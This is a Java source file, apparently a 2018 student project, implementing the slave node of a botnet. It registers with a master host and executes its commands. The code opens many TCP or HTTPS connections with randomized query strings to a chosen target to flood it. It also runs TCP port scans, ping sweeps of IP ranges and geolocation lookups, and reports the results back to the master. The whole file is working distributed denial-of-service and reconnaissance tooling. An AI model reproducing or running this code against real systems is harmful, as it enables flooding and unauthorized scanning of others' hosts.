//File Name: SlaveBot.java
//Author: Vivek Maran
//Email Address: vivek.maran@sjsu.edu
//Programming project: 
//Last Changed: Mar 3, 2018

/*************************** HEADERS ******************************************/
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.io.*;
import java.net.*;
import java.util.Random;

/*************************** TYPES *******************************************/
enum SlaveStatusCodes {
    SUCCESS, FAILURE, TIMEOUT
};
/*************************** CLASS DEFINITIONS *******************************/
class CommandListener
{
    CommandListener(CommandHandler a_commandHandler)
    {
        m_commandHandler = a_commandHandler;
    }
    
    public void start() throws Exception
    {
        try {
            String command;
            // 1 .Connect
            m_socket = new Socket(m_host, m_port);

            // 2. Socket readers and writers
            BufferedReader sReader = new BufferedReader(
                    new InputStreamReader(m_socket.getInputStream()));
            DataOutputStream sWriter = new DataOutputStream(
                    m_socket.getOutputStream());

            // 3. Register with master
            sWriter.writeBytes("REGISTER" + '\n');
            sWriter.flush();

            // 4. Wait for commands from the master
            while ((command = sReader.readLine()) != null) {
                m_commandHandler.HandleCommands(command, sWriter);
            }
        } catch (Exception e) {
            throw (e);
        }        
    }
    
    public String getM_host() {
        return m_host;
    }

    public void setM_host(String m_host) {
        this.m_host = m_host;
    }

    public int getM_port() {
        return m_port;
    }

    public void setM_port(int m_port) {
        this.m_port = m_port;
    }

    public Socket getM_Socket() {
        return m_socket;
    }
    
    public void connect() throws Exception {
        try {
            m_socket = new Socket(m_host, m_port);
        } catch (Exception e) {
            throw (e);
        }
    }
    //Host name or IP address.
    private String m_host;
    
    //Port number in which master is listening.
    private int m_port;
    
    //Master socket
    private Socket m_socket;

    //Command handler
    private CommandHandler m_commandHandler;
}

class TargetConnection
{
    private final String RANDOM_QUERY_SEED_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    
    //Constructor
    TargetConnection(String a_targetHost, Integer a_targetPort,
            Boolean a_keepAlive, String a_url)
            throws UnknownHostException, IOException {
        m_targetHost = a_targetHost;
        m_targetPort = a_targetPort;
        m_keepAlive = a_keepAlive;
        m_executor = Executors.newSingleThreadExecutor();
        m_url = a_url;
        m_HttpConn = null;
        m_reader = null;
    }
    
    public Integer getM_targetPort() {
        return m_targetPort;
    }

    public void setM_targetPort(Integer m_targetPort) {
        this.m_targetPort = m_targetPort;
    }

    public String getM_targetHost() {
        String host = "";
        try {
            host = InetAddress.getByName(m_targetHost).getHostAddress()
                    .toString();
        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        return host;
    }

    public void setM_targetHost(String m_targetHost) {
        this.m_targetHost = m_targetHost;
    }
    
    /**
     * Get random query string
     * @return String
     */
    public String getRandomQueryStr(Integer a_length) {
        StringBuilder randQuery = new StringBuilder();
        Random rnd = new Random();
        while (randQuery.length() < a_length) {
            int index = (int) (rnd.nextFloat()
                    * RANDOM_QUERY_SEED_CHARS.length());
            randQuery.append(RANDOM_QUERY_SEED_CHARS.charAt(index));
        }
        String randQuerystr = randQuery.toString();
        return randQuerystr;
    }
    
    /**
     * Connects to the target, and makes a HTTP GET request with a random 
     * query string.
     * @return {@link Status} represending the execution status of the API.
     */
    public SlaveStatusCodes establish() {
        SlaveStatusCodes ApiStatus = SlaveStatusCodes.FAILURE;
        System.out.println("Thread #" + Thread.currentThread().getId()
         + " Submitting establish request");
        Future<SlaveStatusCodes> future = m_executor.submit(() -> {
            SlaveStatusCodes ExecStatus = SlaveStatusCodes.FAILURE;
            try
            {
                System.out.println("Thread #" + Thread.currentThread().getId()
                        + " Processing establish request");
                if (!(m_url.isEmpty())) {
                    
                    // Length for random query
                    Random rnd = new Random();
                    Integer queryLen = ((rnd.nextInt() & Integer.MAX_VALUE)
                            % 10) + 1;
                    System.out
                            .println("Thread #" + Thread.currentThread().getId()
                                    + " Random query length: " + queryLen);
                    
                    // URL
                    URL url = new URL("https://" + m_targetHost + m_url
                            + getRandomQueryStr(queryLen));
                    System.out
                            .println("Thread #" + Thread.currentThread().getId()
                                    + " HTTPS GET to URL: " + url.toString());

                    m_HttpConn = (HttpURLConnection) url.openConnection();

                    m_HttpConn.setRequestMethod("GET");
                    HttpURLConnection.setFollowRedirects(true);
                    
                    //m_HttpConn.setRequestProperty("Connection", "close");

                    m_HttpConn.setReadTimeout(15 * 1000);
                    m_HttpConn.connect();

                    System.out
                            .println("Thread #" + Thread.currentThread().getId()
                                    + " HTTP response code: "
                                    + m_HttpConn.getResponseCode());
                    m_reader = new BufferedReader(
                            new InputStreamReader(m_HttpConn.getInputStream()));
                    
                    /* Dummy read */
//                    while (m_reader.read() != -1) {
//                    }
                    ExecStatus = SlaveStatusCodes.SUCCESS;
                 }
                else /* TCP connection */
                {
                    System.out
                    .println("Thread #" + Thread.currentThread().getId()
                            + " Establishing TCP connection");
                    m_socket = new Socket(m_targetHost, m_targetPort);
                    System.out
                    .println("Thread #" + Thread.currentThread().getId()
                            + " TCP connection establshed");
                    if (m_keepAlive) {
                        System.out.println(
                                "Thread #" + Thread.currentThread().getId()
                                        + " Setting Keepalive");
                        m_socket.setKeepAlive(true);
                    }
                    ExecStatus = SlaveStatusCodes.SUCCESS;
                }
            }
            catch(Exception e)
            {
                System.err.println(
                        "Error connecting to server" + " "+ e.getMessage());
                System.err.println(e);
//                e.printStackTrace();
                ExecStatus = SlaveStatusCodes.FAILURE;
            }
            return ExecStatus;
        });

        try {
            ApiStatus = future.get(SlaveBot.API_TIMEOUT_SECS, TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println("Error connecting to: " + m_targetHost
                    + " cancelling" + e.getMessage());
            try {
                m_socket.close();
            } catch (IOException sockEx) {
                System.err.println("Error closing the socket: " + m_socket + " "
                        + sockEx.getMessage());
            }
        }
        return ApiStatus;
    }

    public SlaveStatusCodes shutdown() {
        SlaveStatusCodes ApiStatus = SlaveStatusCodes.FAILURE;
        System.out.println("Thread #" + Thread.currentThread().getId()
                + " Submitting shutdown request");
        Future<SlaveStatusCodes> future = m_executor.submit(() -> {
            SlaveStatusCodes ExecStatus = SlaveStatusCodes.FAILURE;
            try {
                if (m_socket != null) /* TCP shutdown */
                {
                    System.out
                            .println("Thread #" + Thread.currentThread().getId()
                                    + " TCP connection shutdown");
                    if (m_socket.isConnected() && !m_socket.isClosed()) {
                        m_socket.close();
                        System.out.println(
                                "Thread #" + Thread.currentThread().getId()
                                        + " Closed socket");
                        ExecStatus = SlaveStatusCodes.SUCCESS;
                    } else {
                        System.err.println("Socket not connected");
                    }
                } else if (m_HttpConn != null) /* HTTP shutdown */
                {
                    System.out
                            .println("Thread #" + Thread.currentThread().getId()
                                    + " HTTP connection shutdown");
                    m_reader.close();
                    m_HttpConn.disconnect();
                    ExecStatus = SlaveStatusCodes.SUCCESS;
                } else {
                    /* Unhandled */
                }
            } catch (Exception e) {
                System.err.println("Thread #" + Thread.currentThread().getId()
                        + " Error in shutdown: " + e.getMessage());
                e.printStackTrace();
                ExecStatus = SlaveStatusCodes.FAILURE;
           
            }
            return ExecStatus;
        });

        try {
            ApiStatus = future.get(SlaveBot.API_TIMEOUT_SECS, TimeUnit.SECONDS);
        } catch (Exception e) {
            System.err.println("Thread #" + Thread.currentThread().getId()
                    + " Error closing socket");
        }
        
        // Shutdown task
        m_executor.shutdown(); // Disable new tasks from being submitted
        try {
            // Wait a while for existing tasks to terminate
            if (!m_executor.awaitTermination(SlaveBot.API_TIMEOUT_SECS,
                    TimeUnit.SECONDS)) {
                m_executor.shutdownNow(); // Cancel currently executing tasks
                // Wait a while for tasks to respond to being cancelled
                if (!m_executor.awaitTermination(SlaveBot.API_TIMEOUT_SECS,
                        TimeUnit.SECONDS))
                    System.err
                            .println("Thread #" + Thread.currentThread().getId()
                                    + " m_executor did not terminate");
                else
                    System.out
                            .println("Thread #" + Thread.currentThread().getId()
                                    + " m_executor stopped");
            }
        } catch (Exception e) {
            System.err.println("Thread #" + Thread.currentThread().getId()
                    + " m_executor did not terminate");
        }
        return ApiStatus;
    }

    //Target host
    private String m_targetHost;
    
    //Target port
    private Integer m_targetPort;
    
    /** Executor */
    private ExecutorService m_executor;

    //Keep alive
    private Boolean m_keepAlive;
    
    //Socket
    private Socket m_socket;
    
    //HTTP connection
    private HttpURLConnection m_HttpConn;
    
    //Reader for this connection
    private BufferedReader m_reader;
    
    //URL
    private String m_url;
}

class CommandHandler
{
    public static final int NUM_ARGS_CONNECT = 4 ;
    public static final int NUM_ARGS_DISCONNECT = 2;
    public static final int NUM_ARGS_TCP_PORT_SCAN = 2;
    public static final int NUM_ARGS_IP_SCAN = 1;
    public static final int PORT_CHECK_TIMEOUT_MS = 500;
    public static final int IP_CHECK_TIMEOUT_MS = 5000;

    public CommandHandler()
    {
        m_targetConns = new ArrayList<TargetConnection>();
    }

    public void HandleCommands(String a_command, DataOutputStream a_writer)
            throws Exception    {
        try {
            String[] commandTokens = a_command.split("\\s+");
            switch (commandTokens[0]) {
            case "connect": {
                if ((commandTokens.length - 1) >= NUM_ARGS_CONNECT) {
                    String targetHost = commandTokens[1];
                    Integer targetPort = Integer.parseInt(commandTokens[2]);
                    Integer numTargetConnections = Integer
                            .parseInt(commandTokens[3]);
                    Boolean keepalive = Boolean.valueOf(commandTokens[4]);
                    String url = "";
                    if ((commandTokens.length - 1) > NUM_ARGS_CONNECT) {
                        url = commandTokens[5];
                    }
                    for (int i = 0; i < numTargetConnections; i++) {
                        // System.out.println("Connecting to " + targetHost + "
                        // "
                        // + targetPort);
                        TargetConnection targetConn = new TargetConnection(
                                targetHost, targetPort, keepalive, url);
                        targetConn.establish();
                        m_targetConns.add(targetConn);
                        // m_targetSockets.add(targetSocket);
                    }
                } else {
                    System.err.println("Invalid syntax for connect");
                }
                break;
            }
            case "disconnect": {
                if ((commandTokens.length - 1) == NUM_ARGS_DISCONNECT) {
                    String targetHost = commandTokens[1];
                    Integer targetPort = Integer.parseInt(commandTokens[2]);
                    ArrayList<TargetConnection> connectionsToClose = 
                            new ArrayList<TargetConnection>();
                    System.out.println("Disconnect received");
                    for (TargetConnection targetConn : m_targetConns) {
                        String targetAddr = targetConn.getM_targetHost();
                        String destinedTargetAddr = InetAddress
                                .getByName(targetHost).getHostAddress();
                        // System.out
                        // .println(targetAddr + " " + destinedTargetAddr);
                        System.out.println(targetAddr + " " + destinedTargetAddr
                                + " " + targetPort + " "
                                + targetConn.getM_targetPort());
                        if (targetAddr.equals(destinedTargetAddr)) {
                            if ((targetPort == -1) || (targetPort == targetConn
                                    .getM_targetPort())) {
                                targetConn.shutdown();
                                connectionsToClose.add(targetConn);
                            }
                        }
                    }
                    m_targetConns.removeAll(connectionsToClose);
                } else {
                    System.err.println("Invalid syntax for disconnect");
                }
                break;
            }
            case "tcpportscan": {
                System.out.println("tcpportscan received");
                if ((commandTokens.length - 1) == NUM_ARGS_TCP_PORT_SCAN) {
                    String targetHost = commandTokens[1];
                    String[] startEndPorts = commandTokens[2].split("-");
                    if (startEndPorts.length == 2) {
                        Integer startPort = Integer.parseInt(startEndPorts[0]);
                        Integer endPort = Integer.parseInt(startEndPorts[1]);
                        String openPorts = new String("");
                        System.out.println("StartPort: " + startPort
                                + " EndPort: " + endPort);
                        for (Integer port = startPort; port <= endPort; port++) {
                            try {
//                                if (port != 5201) {
                                    Socket socket = new Socket();
                                    System.out.print("Scanning "+port+": ");
                                    socket.connect(
                                            new InetSocketAddress(targetHost,
                                                    port),
                                            PORT_CHECK_TIMEOUT_MS);
                                    socket.close();
                                    if (openPorts.isEmpty()) {
                                        openPorts += Integer.toString(port);
                                    } else {
                                        openPorts = openPorts + ","
                                                + Integer.toString(port);
                                    }
                                    System.out.print("open");
//                                }
                            } catch (ConnectException ex) {
                                // System.err.println(
                                // ex.getMessage() + " Port not open: " + port);
                                System.err.print(ex.getMessage());
                            } catch (Exception ex) {
                                System.err.print(ex.getMessage());
                            }
                            System.out.println();
                        }
                        
                        if(openPorts.isEmpty())
                        {
                            openPorts += "No ports open";
                        }
                        System.out.println("Open ports: " + openPorts);
                        try {
                            System.out.println("Writing ports to master");
                            a_writer.writeBytes(openPorts + "\n");
                        } catch (Exception e) {
                            System.err.println(e.getMessage());
                        }
                    }
                    else
                    {
                        System.err.println("Invalid syntax for tcpportscan");
                    }
                } else {
                    System.err.println("Invalid syntax for tcpportscan");
                }
                break;
            }
            case "ipscan":
            {
                System.out.println("ipscan received");
                if ((commandTokens.length - 1) == NUM_ARGS_IP_SCAN) {
                    String[] startEndIps = commandTokens[1].split("-");
                    String scannedIps = new String("");
                    if (startEndIps.length == 2) {
                        String startIpStr = startEndIps[0];
                        String endIpStr = startEndIps[1];
                        if (SlaveBot.validIP(startIpStr)
                                && SlaveBot.validIP(startIpStr)) {
                            long startIp = SlaveBot.ipToLong(startIpStr);
                            long endIp = SlaveBot.ipToLong(endIpStr);
                            for (long ip = startIp; ip <= endIp; ip++) {
                                try {
                                    String ipStr = SlaveBot.longToIp(ip);
                                    InetAddress target = InetAddress
                                            .getByName(ipStr);
//                                    System.out.println("Scanning " + ipStr);

                                    String os = System.getProperties()
                                            .getProperty("os.name");
//                                    System.out.println(os);
                                    Process p1 = null;
                                    if (os.startsWith("Windows")) {
                                        System.out.println(
                                                "Scanning(Win) " + ipStr);
                                        p1 = java.lang.Runtime.getRuntime()
                                                .exec("ping -n 2 -w 5 "
                                                        + ipStr);
                                    } else if (os.contains("OS")
                                            || os.contains("Mac")
                                            || os.contains("Linux")) {
                                        if (os.startsWith("Linux")) {
                                            System.out.println(
                                                    "Scanning(Linux) " + ipStr);
                                            p1 = java.lang.Runtime.getRuntime()
                                                    .exec("ping -c 2 -w 5 "
                                                            + ipStr);
                                        } else if (os.contains("Mac")) {
                                            System.out.println(
                                                    "Scanning(Mac) " + ipStr);
                                            p1 = java.lang.Runtime.getRuntime()
                                                    .exec("ping -c 2 -W 5000 "
                                                            + ipStr);
                                        } else {
                                            System.out.println(
                                                    "Scanning(Unknown OS) "
                                                            + ipStr);
                                            p1 = java.lang.Runtime.getRuntime()
                                                    .exec("ping -c 2 -w 5 "
                                                            + ipStr);
                                        }                                          
                                    } else {
                                        System.out.println(
                                                "Scanning(Unknown) " + ipStr);
                                        p1 = java.lang.Runtime.getRuntime()
                                                .exec("ping -c 2 -w 5 "
                                                        + ipStr);                                                                     
                                    }
                                    int returnVal = p1.waitFor();
                                    boolean reachable = (returnVal==0);
                                    if(reachable)
                                    {
                                        if (scannedIps.isEmpty()) {
                                            scannedIps += ipStr;
                                        } else {
                                            scannedIps = scannedIps + ","
                                                    + ipStr;
                                        }   
                                    }
                                } catch (Exception e) {
                                    System.err.println(e.getMessage());
                                }
                            }
                        } else {
                            System.err.println("Invalid ips for ipscan");
                        }

                        if(scannedIps.isEmpty())
                        {
                            scannedIps += "No IP's alive in the range";
                        }
                        try {
                            System.out.println("Writing IP list to master");
                            a_writer.writeBytes(scannedIps + "\n");
                        } catch (Exception e) {
                            System.err.println(e.getMessage());
                        }
                    } else {
                        System.err.println("Invalid range for ipscan");
                    }
                } else {
                    System.err.println("Invalid num of args for ipscan");
                }
                break;
            }
            case "geoipscan":
            {
                System.out.println("geoipscan received");
                if ((commandTokens.length - 1) == NUM_ARGS_IP_SCAN) {
                    String[] startEndIps = commandTokens[1].split("-");
                    String scannedIps = new String("");

                    if (startEndIps.length == 2) {
                        String startIpStr = startEndIps[0];
                        String endIpStr = startEndIps[1];
                        if (SlaveBot.validIP(startIpStr)
                                && SlaveBot.validIP(startIpStr)) {
                            long startIp = SlaveBot.ipToLong(startIpStr);
                            long endIp = SlaveBot.ipToLong(endIpStr);
                            for (long ip = startIp; ip <= endIp; ip++) {
                                try {
                                    String ipStr = SlaveBot.longToIp(ip);
                                    // System.out.println("Scanning " + ipStr);

                                    String os = System.getProperties()
                                            .getProperty("os.name");
                                    // System.out.println(os);
                                    Process p1 = null;
                                    if (os.startsWith("Windows")) {
                                        System.out.println(
                                                "Scanning(Win) " + ipStr);
                                        p1 = java.lang.Runtime.getRuntime()
                                                .exec("ping -n 2 -w 5 "
                                                        + ipStr);
                                    } else if (os.contains("OS")
                                            || os.contains("Mac")
                                            || os.contains("Linux")) {
                                        if (os.startsWith("Linux")) {
                                            System.out.println(
                                                    "Scanning(Linux) " + ipStr);
                                            p1 = java.lang.Runtime.getRuntime()
                                                    .exec("ping -c 2 -w 5 "
                                                            + ipStr);
                                        } else if (os.contains("Mac")) {
                                            System.out.println(
                                                    "Scanning(Mac) " + ipStr);
                                            p1 = java.lang.Runtime.getRuntime()
                                                    .exec("ping -c 2 -W 5000 "
                                                            + ipStr);
                                        } else {
                                            System.out.println(
                                                    "Scanning(Unknown OS) "
                                                            + ipStr);
                                            p1 = java.lang.Runtime.getRuntime()
                                                    .exec("ping -c 2 -w 5 "
                                                            + ipStr);
                                        }
                                    } else {
                                        System.out.println(
                                                "Scanning(Unknown) " + ipStr);
                                        p1 = java.lang.Runtime.getRuntime()
                                                .exec("ping -c 2 -w 5 "
                                                        + ipStr);
                                    }
                                    int returnVal = p1.waitFor();
                                    boolean reachable = (returnVal == 0);
                                    if (reachable) {
                                        if (scannedIps.isEmpty()) {
                                            scannedIps += ipStr;
                                        } else {
                                            scannedIps = scannedIps + "\n"
                                                    + ipStr;
                                        }
                                        URL ipapi = new URL(
                                                "http://ip-api.com/csv/"
                                                        + ipStr);
                                        URLConnection c = ipapi
                                                .openConnection();
                                        c.setRequestProperty("User-Agent",
                                                "java-ipapi-client");
                                        BufferedReader reader = new BufferedReader(
                                                new InputStreamReader(
                                                        c.getInputStream()));
                                        String geoDataJson = reader.readLine();
                                        String[] geoDataFields = geoDataJson
                                                .split(",");
                                        Integer index = 0;
                                        for (String geoDataField : geoDataFields) {
                                            if ((index == 0)
                                                    || (index == (geoDataFields.length
                                                            - 1))) {
                                                /* Ignore first and last */
                                            } else {
                                                scannedIps += ","
                                                        + geoDataField;

                                            }
                                            index++;
                                        }
                                        reader.close();
                                    }
                                } catch (Exception e) {
                                    System.err.println(
                                            "geoipscan ex:" + e.getMessage());
                                }
                            }
                        } else {
                            System.err.println("Invalid ips for ipscan");
                        }

                        if(scannedIps.isEmpty())
                        {
                            scannedIps += "No IP's alive in the range";
                        }
                        try {
                            System.out.println("Writing IP list to master");
                            a_writer.writeBytes(scannedIps + "\n");
                        } catch (Exception e) {
                            System.err.println(e.getMessage());
                        }
                    } else {
                        System.err.println("Invalid range for ipscan");
                    }
                } else {
                    System.err.println("Invalid num of args for ipscan");
                }
                break;
            }
            }
        } catch (Exception e) {
            //throw (e);
            System.out.println(e.getMessage());
        }
        
    }
    
     //Target sockets
//    private ArrayList<Socket> m_targetSockets;

    //Target connections
    private ArrayList<TargetConnection> m_targetConns; 
}
public class SlaveBot {

    static final Integer API_TIMEOUT_SECS = 60;
    static final Integer FAILURE = -1;
    static final Integer SUCCESS = 0;
    
    public static void main(String[] args) {
        try {
            SlaveBot slave = new SlaveBot(args);
            slave.start();
            System.exit(SUCCESS);
            
        } catch (Exception e) {
            System.out.println(e.getMessage() + " exiting");
            e.printStackTrace();
            System.exit(FAILURE);
        }
    }
 
    /* 
     * References to this logic: 
     * http://technojeeves.com/index.php/21-convert-ip-address-to-number
     * https://stackoverflow.com/questions/28502634/how-to-extract-the-first-three-segments-of-an-ip-address-in-android
     * https://stackoverflow.com/questions/4581877/validating-ipv4-string-in-java
     */

    /**
     * Convert an IP address to a number
     *
     * @param ipAddress Input IP address
     *
     * @return The IP address as a number
     */
     public static long ipToLong(String ipAddress) {
         long result = 0;
         String[] atoms = ipAddress.split("\\.");
         for (int i = 3; i >= 0; i--) {
             result |= (Long.parseLong(atoms[3 - i]) << (i * 8));
         }
         return result & 0xFFFFFFFF;
     }

     public static String longToIp(long ip) {
         StringBuilder sb = new StringBuilder(15);
         for (int i = 0; i < 4; i++) {
             sb.insert(0, Long.toString(ip & 0xff));
             if (i < 3) {
                 sb.insert(0, '.');
             }
             ip >>= 8;
         }
         return sb.toString();
     }

     public static boolean validIP (String ip) {
         try {
             if ( ip == null || ip.isEmpty() ) {
                 return false;
             }

             String[] parts = ip.split( "\\." );
             if ( parts.length != 4 ) {
                 return false;
             }

             for ( String s : parts ) {
                 int i = Integer.parseInt( s );
                 if ( (i < 0) || (i > 255) ) {
                     return false;
                 }
             }
             if ( ip.endsWith(".") ) {
                 return false;
             }

             return true;
         } catch (NumberFormatException nfe) {
             return false;
         }
     }

     /**
     * Stores the command line params into this Bot
     * @param args -[IN] Arguments received from the user.
     */
    private void configureCommandListener(String[] args) {

        if (args.length == 4) {
            for (int i = 0; i < (args.length - 1); i++) {
                try {
                    int KeyIdentiferIndex = args[i].indexOf('-');
                    if (-1 != KeyIdentiferIndex) {
                        /*
                         * Argument is a key store the value from next string if
                         * it is a valid key
                         */
                        char Key = args[i].charAt(KeyIdentiferIndex + 1);
                        switch (Key) {
                        case 'p': {
                            String port = args[i + 1];
                            Integer portNum = Integer.parseInt(port);
                            m_commandListener.setM_port(portNum);
//                            System.out.println(portNum);
                            break;
                        }
                        case 'h': {
                            String host = args[i + 1];
                            m_commandListener.setM_host(host);
//                            System.out.println(host);
                            break;
                        }
                        default: {
                            throw new IllegalArgumentException(
                                    "Invalid option" + Key);
                        }
                        }
                    } else {
                        /* Loop through */
                    }
                } catch (IndexOutOfBoundsException e) {
                    System.err.println(
                            "IndexOutOfBoundsException: " + e.getMessage());
                } catch (IllegalArgumentException e) {
                    System.err.println(
                            "IllegalArgumentException: " + e.getMessage());
                }
            }
        } else {
            throw new IllegalArgumentException(
                    "Wrong number of arguments passed");
        }
    }

    /**
     * Default constructor
     * 
     * @param args
     *            -[IN] Arguments for this bot
     */
    SlaveBot(String[] args) {
        try {
            m_commandHandler = new CommandHandler();
            m_commandListener = new CommandListener(m_commandHandler);
            configureCommandListener(args);
        } catch (Exception e) {
            throw (e);
        }
    }
    
    /**
     * Starts the MasterBot
     * @throws Exception 
     */
    private void start() throws Exception {

        try {
            m_commandListener.start();
        } catch (Exception e) {
            throw (e);
        }
    }

    // Master of this slave
    private CommandListener m_commandListener;
    
    //Command handler
    private CommandHandler m_commandHandler;
}